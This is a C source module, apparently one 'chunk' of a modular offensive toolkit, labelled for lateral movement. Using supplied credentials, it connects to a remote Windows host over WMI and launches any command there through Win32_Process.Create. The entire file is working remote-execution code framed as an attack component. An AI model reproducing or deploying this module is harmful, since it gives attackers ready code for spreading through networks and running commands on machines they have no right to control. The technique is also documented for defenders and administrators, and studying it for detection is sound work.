// chunk: lateral/wmi_exec
// depends: (none)
// provides: lateral_wmi_exec
// headers: windows.h, wbemidl.h
// libs: ole32, oleaut32, wbemuuid
// note: Execute command on remote host via WMI Win32_Process.Create

#ifndef CHUNK_LATERAL_WMI_EXEC
#define CHUNK_LATERAL_WMI_EXEC

#include <wbemidl.h>

static int lateral_wmi_exec(const char *target_host, const char *command,
                            const char *username, const char *password) {
    HRESULT hr;
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    int result = 0;

    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 0;

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
                              RPC_C_AUTHN_LEVEL_DEFAULT,
                              RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL, EOAC_NONE, NULL);

    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (LPVOID *)&pLoc);
    if (FAILED(hr)) {
        CoUninitialize();
        return 0;
    }

    wchar_t wpath[512];
    swprintf(wpath, 512, L"\\\\%hs\\root\\cimv2", target_host);

    BSTR bstrPath = SysAllocString(wpath);
    BSTR bstrUser = username ? SysAllocString((wchar_t[]){0}) : NULL;
    BSTR bstrPass = password ? SysAllocString((wchar_t[]){0}) : NULL;

    if (username) {
        wchar_t wuser[256];
        MultiByteToWideChar(CP_UTF8, 0, username, -1, wuser, 256);
        SysFreeString(bstrUser);
        bstrUser = SysAllocString(wuser);
    }
    if (password) {
        wchar_t wpass[256];
        MultiByteToWideChar(CP_UTF8, 0, password, -1, wpass, 256);
        SysFreeString(bstrPass);
        bstrPass = SysAllocString(wpass);
    }

    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstrPath, bstrUser, bstrPass,
                                      NULL, 0, NULL, NULL, &pSvc);

    SysFreeString(bstrPath);
    if (bstrUser) SysFreeString(bstrUser);
    if (bstrPass) SysFreeString(bstrPass);

    if (FAILED(hr)) {
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return 0;
    }

    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                           RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                           NULL, EOAC_NONE);

    BSTR className = SysAllocString(L"Win32_Process");
    BSTR methodName = SysAllocString(L"Create");

    IWbemClassObject *pClass = NULL;
    IWbemClassObject *pInParamsDefinition = NULL;
    IWbemClassObject *pInParams = NULL;

    hr = pSvc->lpVtbl->GetObject(pSvc, className, 0, NULL, &pClass, NULL);
    if (SUCCEEDED(hr)) {
        hr = pClass->lpVtbl->GetMethod(pClass, methodName, 0, &pInParamsDefinition, NULL);
        if (SUCCEEDED(hr)) {
            hr = pInParamsDefinition->lpVtbl->SpawnInstance(pInParamsDefinition, 0, &pInParams);
            if (SUCCEEDED(hr)) {
                VARIANT varCmd;
                VariantInit(&varCmd);
                varCmd.vt = VT_BSTR;
                wchar_t wcmd[1024];
                MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, 1024);
                varCmd.bstrVal = SysAllocString(wcmd);
                hr = pInParams->lpVtbl->Put(pInParams, L"CommandLine", 0, &varCmd, 0);
                VariantClear(&varCmd);

                IWbemClassObject *pOutParams = NULL;
                hr = pSvc->lpVtbl->ExecMethod(pSvc, className, methodName, 0,
                                               NULL, pInParams, &pOutParams, NULL);
                if (SUCCEEDED(hr)) {
                    result = 1;
                    if (pOutParams) pOutParams->lpVtbl->Release(pOutParams);
                }
                pInParams->lpVtbl->Release(pInParams);
            }
            pInParamsDefinition->lpVtbl->Release(pInParamsDefinition);
        }
        pClass->lpVtbl->Release(pClass);
    }

    SysFreeString(className);
    SysFreeString(methodName);
    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    return result;
}

#endif
